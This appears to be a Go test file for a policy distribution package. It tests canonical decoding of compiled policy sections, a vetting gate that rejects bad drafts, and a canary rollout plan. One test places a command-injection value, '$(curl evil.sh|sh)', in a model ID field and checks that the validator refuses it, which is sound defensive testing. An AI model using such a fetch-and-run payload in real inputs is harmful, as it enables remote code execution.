package policydist

import (
	"crypto/sha256"
	"encoding/json"
	"errors"
	"math"
	"os"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
)

// compilerFixture is python/intel's compiler output for test_policy_compiler.py's ledger fixture; both suites pin the same bytes and goldens.
const compilerFixture = "../../../../python/intel/tests/fixtures/policy_compiler_sections.cbor"

func readCompilerFixture(t *testing.T) []byte {
	t.Helper()
	raw, err := os.ReadFile(compilerFixture)
	if err != nil {
		t.Fatalf("compiler fixture: %v", err)
	}
	return raw
}

// draftOf splits a canonical six-section map into the per-section bytes intel stores (m1_070).
func draftOf(t *testing.T, sectionsCBOR []byte, channel string) draft {
	t.Helper()
	s, err := DecodeSections(sectionsCBOR)
	if err != nil {
		t.Fatal(err)
	}
	per, err := sectionBytes(s)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(sectionsCBOR)
	return draft{Channel: channel, WindowStart: time.Date(2026, 9, 15, 0, 0, 0, 0, time.UTC), Sections: per, Hash: sum[:], MaxAge: 7 * 24 * time.Hour, KneeOK: true, KneeNote: "within ±1"}
}

func near(a, b float64) bool { return math.Abs(a-b) < 1e-9 }

// TestDraftPublisherDecodesCompilerFixture is 06 §10.4 rule 1's round-trip: the compiler's bytes under THIS strict decoder, canonical byte-for-byte.
func TestDraftPublisherDecodesCompilerFixture(t *testing.T) {
	raw := readCompilerFixture(t)
	s, err := DecodeSections(raw)
	if err != nil {
		t.Fatalf("compiler output does not pass the reference decoder: %v", err)
	}
	r := s.Route
	if len(r.CPVS) != 3 || r.CPVS[0].TaskClass != "fn" || r.CPVS[0].ModelID != "haiku" || r.CPVS[0].TokensEst != 500 ||
		!near(r.CPVS[0].PPass, 0.4904546500516039) || !near(r.CPVS[1].PPass, 0.5536808809284809) ||
		r.CPVS[2].TaskClass != "repo" || !near(r.CPVS[2].PPass, 0.5834478625635624) || r.CPVS[2].TokensEst != 2800 {
		t.Fatalf("cpvs: %+v", r.CPVS)
	}
	if len(r.Ladders) != 2 || r.Ladders[0].LadderID != "fn" || len(r.Ladders[0].Rungs) != 2 ||
		r.Ladders[0].Rungs[0] != (Rung{ModelID: "haiku", KeepPrefix: true}) || r.Ladders[0].Rungs[1] != (Rung{ModelID: "sonnet"}) ||
		r.Ladders[1].LadderID != "repo" || len(r.Ladders[1].Rungs) != 1 {
		t.Fatalf("ladders: %+v", r.Ladders)
	}
	k := r.Knee
	if k.CostBasis != "quota" || k.Basis != "certified" || k.VDefault != 5 || len(k.Rows) != 2 ||
		k.Rows[0].N != 1 || !near(k.Rows[0].CN, 2.4) || k.Rows[0].PLCB == nil || !near(*k.Rows[0].PLCB, 0.5973204854580024) ||
		k.Rows[1].N != 2 || !near(k.Rows[1].CN, 5.6) || k.Rows[1].PLCB == nil || !near(*k.Rows[1].PLCB, 0.33630882869327483) {
		t.Fatalf("knee: %+v", k)
	}
	if r.Exploration != nil || r.ExplorationOptIn != nil {
		t.Fatalf("epsilon must be absent (FR-ROUTE-003 default 0): %+v", r)
	}
	if s.Verify.Priors != [4]float64{0.25, 0.25, 0.25, 0.25} || len(s.Verify.Anchors) != 0 ||
		s.Gates != (GatesSection{StopGateEnabled: true, MaxConsecutiveBlocks: 3}) ||
		s.Cortex.MapBudgetTokens != (BudgetRange{}) || len(s.Cortex.Channels) != 0 || s.Memory.Budgets.PackTokensMax != 0 || len(s.AgentMaps.Agents) != 0 {
		t.Fatalf("first-publication defaults: %+v", s)
	}
	// vet reassembles the per-section split into the same bytes and passes the whole gate.
	dr, body, err := vet(draftOf(t, raw, "canary"))
	if err != nil || string(body) != string(raw) || string(dr.SectionsCBOR) != string(raw) || dr.Channel != "canary" || dr.MaxAge != 7*24*time.Hour {
		t.Fatalf("vet: %v %+v", err, dr)
	}
}

func TestVetRefusals(t *testing.T) {
	raw := readCompilerFixture(t)
	code := func(err error) string {
		var rej *RejectError
		if errors.As(err, &rej) {
			return rej.Code
		}
		return "<" + err.Error() + ">"
	}

	d := draftOf(t, raw, "canary")
	d.Hash[0] ^= 0xff
	if _, _, err := vet(d); code(err) != "M1E-3001" || !strings.Contains(err.Error(), "draft_hash") {
		t.Fatalf("hash mismatch: %v", err)
	}

	d = draftOf(t, raw, "canary")
	d.KneeOK, d.KneeNote = false, "implied knee 2 vs k*=4: VIOLATED"
	if _, _, err := vet(d); code(err) != "M1E-3001" || !strings.Contains(err.Error(), "VIOLATED") {
		t.Fatalf("knee gate: %v", err)
	}

	d = draftOf(t, raw, "canary")
	delete(d.Sections, "gates")
	if _, _, err := vet(d); code(err) != "M1E-3001" || !strings.Contains(err.Error(), "gates") {
		t.Fatalf("missing section: %v", err)
	}

	// The compiler's hash is right but a route string is a command: M1E-3005, never published.
	evil := validSections()
	evil.Route.Ladders[0].Rungs[0].ModelID = "$(curl evil.sh|sh)"
	d = draftOfUnchecked(t, evil, "canary")
	if _, _, err := vet(d); code(err) != "M1E-3005" {
		t.Fatalf("command string: %v", err)
	}

	// Non-canonical section bytes (indefinite-length map) with a matching hash: M1E-3005.
	d = draftOfUnchecked(t, validSections(), "canary")
	d.Sections["memory"] = append([]byte{0xbf}, append(d.Sections["memory"][1:], 0xff)...)
	d.Hash = rehash(t, d)
	if _, _, err := vet(d); code(err) != "M1E-3005" {
		t.Fatalf("non-canonical: %v", err)
	}

	if _, _, err := vet(draftOfUnchecked(t, validSections(), "canary")); err != nil {
		t.Fatalf("baseline must vet: %v", err)
	}
}

// draftOfUnchecked splits Sections the Go types can express but Validate may refuse.
func draftOfUnchecked(t *testing.T, s Sections, channel string) draft {
	t.Helper()
	per, err := sectionBytes(s)
	if err != nil {
		t.Fatal(err)
	}
	d := draft{Channel: channel, WindowStart: time.Date(2026, 9, 15, 0, 0, 0, 0, time.UTC), Sections: per, MaxAge: time.Hour, KneeOK: true}
	d.Hash = rehash(t, d)
	return d
}

// rehash assembles the six-section map by hand (keys in encoded-byte order, values verbatim) so a non-canonical section can be hashed as a buggy compiler would.
func rehash(t *testing.T, d draft) []byte {
	t.Helper()
	keys := make([]string, 0, len(d.Sections))
	for k := range d.Sections {
		keys = append(keys, k)
	}
	sort.Strings(keys) // all six names are under 24 bytes, so encoded-byte order is (length, bytes)
	sort.SliceStable(keys, func(i, j int) bool { return len(keys[i]) < len(keys[j]) })
	out := []byte{0xa0 | byte(len(keys))}
	for _, k := range keys {
		out = append(append(append(out, 0x60|byte(len(k))), k...), d.Sections[k]...)
	}
	sum := sha256.Sum256(out)
	return sum[:]
}

func TestNewCanaryPlan(t *testing.T) {
	devs := []uuid.UUID{uuid.New()}
	b, err := json.Marshal(NewCanaryPlan(7, devs))
	if err != nil {
		t.Fatal(err)
	}
	var got map[string]any
	if err := json.Unmarshal(b, &got); err != nil {
		t.Fatal(err)
	}
	cohort := got["canary_cohort"].(map[string]any)
	widen := got["widen_criteria"].(map[string]any)
	halt := got["halt"].(map[string]any)
	if got["seq"] != 7.0 || cohort["percent"] != 5.0 || cohort["devices"].([]any)[0] != devs[0].String() ||
		widen["ack_coverage_min"] != WidenCoverage || widen["rejected_max"] != 0.0 || widen["soak_minutes"] != 60.0 ||
		len(widen["health_signals"].([]any)) != 3 || halt["command_string_acks_max"] != 0.0 ||
		halt["rejected_ratio_max"] != HaltRejectedRatio || halt["partial_ratio_max"] != HaltPartialRatio ||
		got["rollback"] != "previous content republished under a higher seq" {
		t.Fatalf("plan: %s", b)
	}
	if steps := got["steps"].([]any); len(steps) != 3 || steps[0] != 5.0 || steps[2] != 100.0 {
		t.Fatalf("steps: %v", steps)
	}
}
